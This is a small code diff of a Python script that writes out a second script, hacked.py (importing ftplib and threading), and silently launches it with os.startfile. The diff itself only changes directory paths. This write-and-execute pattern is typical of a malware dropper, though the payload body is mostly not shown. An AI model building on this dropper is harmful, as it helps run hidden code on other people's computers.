@@ -1,6 +1,6 @@
 import os
 def olustur():
-    stal = open("C:\Ayaz\cw\hacked.py", "w")
+    stal = open("C:\Ayaz\Arne\hacked.py", "w")
     stal.write("""import os
 import ftplib
 import threading
@@ -21,5 +21,5 @@ t = Mainloop()
 t.start()
 """)
     stal.close()
-    os.chdir("C:\\Ayaz\\cw")
-    os.startfile("C:\Ayaz\cw\hacked.py")
+    os.chdir("C:\\Ayaz\\Arne")
+    os.startfile("C:\Ayaz\Arne\hacked.py")
